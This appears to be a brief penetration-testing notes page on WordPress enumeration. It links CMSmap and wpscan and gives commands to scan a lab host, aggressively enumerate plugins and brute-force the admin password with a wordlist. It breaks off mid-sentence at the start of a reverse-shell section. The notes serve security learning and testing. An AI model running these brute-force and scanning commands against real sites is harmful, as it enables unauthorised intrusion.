---
description: Wordpress enumeration tools.
---

# Wordpress

CMSMAP - [https://github.com/Dionach/CMSmap](https://github.com/Dionach/CMSmap)

wpscan - [https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)P

I installed CMSMAP at /opt/cmsmap directory.

```
cd /opt/cmsmap
$ python3 cmsmap.py http://192.168.1.2
```

```
$ wpscan --url http://192.168.1.2/ --api-token {APITOKEN}

$ wpscan --url http://192.168.1.2/ --passwords ~/rockyou.txt --usernames admin

$ wpscan --update --url http://192.168.1.2/ --enumerate ap --plugins-detection aggressive
```

### Getting reverse shell

When we have access to the admin panel, we can us
